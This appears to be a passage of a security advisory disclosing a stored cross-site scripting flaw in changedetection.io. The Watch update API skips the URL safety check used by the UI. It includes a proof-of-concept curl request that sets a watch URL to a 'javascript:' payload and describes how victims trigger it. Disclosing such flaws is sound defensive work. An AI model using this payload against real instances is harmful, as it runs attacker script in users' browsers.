  "summary": "changedetection.io: Stored XSS in Watch update via API",
  "details": "### Summary\n\nA Stored Cross Site Scripting is present in the changedetection.io Watch update API due to unsufficient security checks.\n\n### Details\n\nTested on changedetection.io version *v0.50.24*\n\n```console\nREPOSITORY                            TAG       IMAGE ID       CREATED        SIZE\nghcr.io/dgtlmoon/changedetection.io   latest    0367276509a0   23 hours ago   599MB\n```\n\nWhen a user tries to add an unsafe URL as a Watch in the changedetection.io UI, the action is blocked with the error message \"Watch protocol is not permitted by SAFE_PROTOCOL_REGEX or incorrect URL format\".\nThis is catched by the function `validate_url(test_url)`.\n\n```python\ndef validate_url(test_url):\n    # ...\n    from .model.Watch import is_safe_url\n    if not is_safe_url(test_url):\n        # This should be wtforms.validators.\n        raise ValidationError('Watch protocol is not permitted by SAFE_PROTOCOL_REGEX or incorrect URL format')\n```\n\nWhen instead the Watch API is used, this check is not performed resulting in unsafe URLs added as Watch.\n\n### PoC\n\nUpdate an existing watch with an unsafe URL\n```console\ncurl -X PUT \"http://example.site/api/v1/watch/1242e1c5-d59e-4352-0078-203a55b21282\" \\\n  -H \"x-api-key: XXX\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"url\": \"javascript:alert(document.domain)\",\n    \"title\": \"XSS PoC\",\n    \"paused\": false\n  }'\n```\n\n### Impact\n\nTwo scenarios are possibile:\n\n1. An attacker can insert a new watch with an arbitrary URL which really points to a web page. Once the HTML content is retrieved, the attacker updates the URL with a JavaScript payload.\n2. An attacker substitutes the URL in an existing watch with a new URL that is in reality a JavaScript payload.\n\nWhen the user clicks on *Preview* and then on the malicious link, the JavaScript malicious code is executed.\n\n\u003cimg width=\"1200\" height=\"643\" alt=\"poc1\" src=\"https://github.com/user-attachments/assets/db81e0c7-b6d3-4332-b15d-a688a48c3227\" /\u003e\n\u003cbr\u003e\n\u003cimg width=\"1200\" height=\"643\" alt=\"poc2\" src=\"https://github.com/user-attachments/assets/e704b37c-d339-4322-9fc0-ad50dd86b31d\" /\u003e\n\n\n\n### Credits\n\nEdoardo Ottavianelli @edoardottt",
